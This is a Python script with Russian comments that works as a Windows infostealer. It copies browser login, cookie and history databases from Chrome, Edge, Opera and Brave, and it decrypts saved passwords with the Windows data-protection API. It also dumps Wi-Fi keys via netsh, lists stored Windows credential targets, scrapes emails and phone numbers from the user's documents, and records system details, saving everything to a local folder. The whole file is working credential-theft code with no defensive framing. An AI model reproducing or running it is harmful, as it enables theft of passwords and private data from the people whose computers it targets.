import os
import json
import sqlite3
import shutil
import base64
import win32crypt
from datetime import datetime, timedelta
import requests
import re
from pathlib import Path

# Константы для сбора данных
OUTPUT_DIR = "collected_data"
CHROME_PATH = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
EDGE_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default")
OPERA_PATH = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
BRAVE_PATH = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default")

class DataCollector:
    def __init__(self):
        self.output_dir = OUTPUT_DIR
        self.create_output_directory()
        
    def create_output_directory(self):
        """Создание директории для выходных файлов"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def collect_browser_data(self, browser_path, browser_name):
        """Сбор данных из браузера"""
        try:
            if not os.path.exists(browser_path):
                return
                
            # Копирование файлов базы данных
            db_files = ['Login Data', 'History', 'Cookies', 'Web Data']
            for db_file in db_files:
                src_path = os.path.join(browser_path, db_file)
                if os.path.exists(src_path):
                    dst_path = os.path.join(self.output_dir, f"{browser_name}_{db_file}.db")
                    shutil.copy2(src_path, dst_path)
                    
            # Извлечение паролей
            self.extract_passwords(browser_path, browser_name)
            
            # Извлечение истории
            self.extract_history(browser_path, browser_name)
            
        except Exception as e:
            self.log_error(f"Error collecting {browser_name} data: {str(e)}")
            
    def extract_passwords(self, browser_path, browser_name):
        """Извлечение сохраненных паролей"""
        try:
            login_db = os.path.join(browser_path, 'Login Data')
            if not os.path.exists(login_db):
                return
                
            # Создание временной копии
            temp_db = os.path.join(self.output_dir, f'temp_{browser_name}_login.db')
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            
            passwords = []
            for row in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                    if password:
                        passwords.append({
                            'url': row[0],
                            'username': row[1],
                            'password': password.decode('utf-8', errors='ignore'),
                            'created': row[3]
                        })
                except:
                    continue
                    
            conn.close()
            os.remove(temp_db)
            
            if passwords:
                with open(os.path.join(self.output_dir, f'{browser_name}_passwords.txt'), 'w', encoding='utf-8') as f:
                    for p in passwords:
                        f.write(f"URL: {p['url']}\n")
                        f.write(f"Username: {p['username']}\n")
                        f.write(f"Password: {p['password']}\n")
                        f.write(f"Created: {p['created']}\n")
                        f.write("-" * 50 + "\n")
                        
        except Exception as e:
            self.log_error(f"Error extracting {browser_name} passwords: {str(e)}")
            
    def extract_history(self, browser_path, browser_name):
        """Извлечение истории браузера"""
        try:
            history_db = os.path.join(browser_path, 'History')
            if not os.path.exists(history_db):
                return
                
            temp_db = os.path.join(self.output_dir, f'temp_{browser_name}_history.db')
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            
            history = []
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': row[3]
                })
                
            conn.close()
            os.remove(temp_db)
            
            if history:
                with open(os.path.join(self.output_dir, f'{browser_name}_history.txt'), 'w', encoding='utf-8') as f:
                    for h in history:
                        f.write(f"URL: {h['url']}\n")
                        f.write(f"Title: {h['title']}\n")
                        f.write(f"Visits: {h['visit_count']}\n")
                        f.write(f"Last visit: {h['last_visit']}\n")
                        f.write("-" * 50 + "\n")
                        
        except Exception as e:
            self.log_error(f"Error extracting {browser_name} history: {str(e)}")
            
    def collect_system_info(self):
        """Сбор системной информации"""
        try:
            info = []
            
            # Информация о пользователе
            info.append(f"Username: {os.getenv('USERNAME')}")
            info.append(f"Computer name: {os.getenv('COMPUTERNAME')}")
            info.append(f"User domain: {os.getenv('USERDOMAIN')}")
            info.append(f"System drive: {os.getenv('SystemDrive')}")
            info.append(f"OS: {os.getenv('OS')}")
            
            # Сетевые интерфейсы
            info.append("\nNetwork interfaces:")
            import socket
            hostname = socket.gethostname()
            info.append(f"Hostname: {hostname}")
            try:
                ip = socket.gethostbyname(hostname)
                info.append(f"IP Address: {ip}")
            except:
                pass
                
            # Сохранение
            with open(os.path.join(self.output_dir, 'system_info.txt'), 'w', encoding='utf-8') as f:
                f.write('\n'.join(info))
                
        except Exception as e:
            self.log_error(f"Error collecting system info: {str(e)}")
            
    def collect_wifi_passwords(self):
        """Сбор сохраненных паролей WiFi"""
        try:
            wifi_data = []
            
            # Получение списка профилей WiFi
            result = os.popen('netsh wlan show profiles').read()
            profiles = re.findall(r'All User Profile\s*:\s(.*)', result)
            
            for profile in profiles:
                profile = profile.strip()
                try:
                    # Получение пароля для профиля
                    password_result = os.popen(f'netsh wlan show profile "{profile}" key=clear').read()
                    password_match = re.search(r'Key Content\s*:\s(.*)', password_result)
                    
                    if password_match:
                        wifi_data.append({
                            'ssid': profile,
                            'password': password_match.group(1).strip()
                        })
                except:
                    continue
                    
            if wifi_data:
                with open(os.path.join(self.output_dir, 'wifi_passwords.txt'), 'w', encoding='utf-8') as f:
                    for wifi in wifi_data:
                        f.write(f"SSID: {wifi['ssid']}\n")
                        f.write(f"Password: {wifi['password']}\n")
                        f.write("-" * 30 + "\n")
                        
        except Exception as e:
            self.log_error(f"Error collecting WiFi passwords: {str(e)}")
            
    def extract_emails_phones(self):
        """Извлечение email и телефонных номеров из файлов"""
        try:
            emails = set()
            phones = set()
            
            # Поиск в текстовых файлах пользователя
            user_dirs = [
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads"),
                os.path.expanduser("~\\Desktop")
            ]
            
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            phone_pattern = r'(\+7|8)[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{2}[\s-]?\d{2}'
            
            for directory in user_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files[:50]:  # Ограничение для производительности
                            if file.endswith(('.txt', '.doc', '.docx', '.pdf')):
                                try:
                                    filepath = os.path.join(root, file)
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read(5000)  # Чтение первых 5000 символов
                                        
                                        found_emails = re.findall(email_pattern, content)
                                        emails.update(found_emails)
                                        
                                        found_phones = re.findall(phone_pattern, content)
                                        phones.update(found_phones)
                                except:
                                    continue
                                    
            # Сохранение результатов
            if emails:
                with open(os.path.join(self.output_dir, 'found_emails.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(emails))
                    
            if phones:
                with open(os.path.join(self.output_dir, 'found_phones.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(phones))
                    
        except Exception as e:
            self.log_error(f"Error extracting emails/phones: {str(e)}")
            
    def collect_windows_creds(self):
        """Сбор учетных данных Windows"""
        try:
            creds = []
            
            # Получение сохраненных учетных данных через cmdkey
            result = os.popen('cmdkey /list').read()
            lines = result.split('\n')
            
            for line in lines:
                if 'Target:' in line:
                    target = line.replace('Target:', '').strip()
                    creds.append(target)
                    
            if creds:
                with open(os.path.join(self.output_dir, 'windows_credentials.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(creds))
                    
        except Exception as e:
            self.log_error(f"Error collecting Windows credentials: {str(e)}")
            
    def collect_recent_files(self):
        """Сбор списка недавних файлов"""
        try:
            recent_path = os.path.expanduser("~\\Recent")
            if os.path.exists(recent_path):
                recent_files = os.listdir(recent_path)[:500]  # Ограничение
                
                with open(os.path.join(self.output_dir, 'recent_files.txt'), 'w', encoding='utf-8') as f:
                    for file in recent_files:
                        f.write(f"{file}\n")
                        
        except Exception as e:
            self.log_error(f"Error collecting recent files: {str(e)}")
            
    def log_error(self, error_msg):
        """Логирование ошибок"""
        with open(os.path.join(self.output_dir, 'errors.log'), 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now()}: {error_msg}\n")
            
    def create_summary(self):
        """Создание сводного файла"""
        try:
            summary = []
            summary.append("=== DATA COLLECTION SUMMARY ===")
            summary.append(f"Time: {datetime.now()}")
            summary.append(f"Output directory: {os.path.abspath(self.output_dir)}")
            summary.append("\nCollected files:")
            
            files = os.listdir(self.output_dir)
            for file in files:
                if file != 'summary.txt' and file != 'errors.log':
                    filepath = os.path.join(self.output_dir, file)
                    size = os.path.getsize(filepath)
                    summary.append(f"  - {file} ({size} bytes)")
                    
            with open(os.path.join(self.output_dir, 'summary.txt'), 'w', encoding='utf-8') as f:
                f.write('\n'.join(summary))
                
        except Exception as e:
            self.log_error(f"Error creating summary: {str(e)}")
            
    def run(self):
        """Основной метод запуска сбора данных"""
        print("[+] Starting data collection...")
        
        # Сбор данных из браузеров
        print("[+] Collecting browser data...")
        self.collect_browser_data(CHROME_PATH, "Chrome")
        self.collect_browser_data(EDGE_PATH, "Edge")
        self.collect_browser_data(OPERA_PATH, "Opera")
        self.collect_browser_data(BRAVE_PATH, "Brave")
        
        # Сбор системной информации
        print("[+] Collecting system information...")
        self.collect_system_info()
        
        # Сбор WiFi паролей
        print("[+] Collecting WiFi passwords...")
        self.collect_wifi_passwords()
        
        # Извлечение email и телефонов
        print("[+] Extracting emails and phones...")
        self.extract_emails_phones()
        
        # Сбор учетных данных Windows
        print("[+] Collecting Windows credentials...")
        self.collect_windows_creds()
        
        # Сбор недавних файлов
        print("[+] Collecting recent files...")
        self.collect_recent_files()
        
        # Создание сводки
        print("[+] Creating summary...")
        self.create_summary()
        
        print(f"[+] Data collection complete! Files saved to: {os.path.abspath(self.output_dir)}")

if __name__ == "__main__":
    collector = DataCollector()
    collector.run()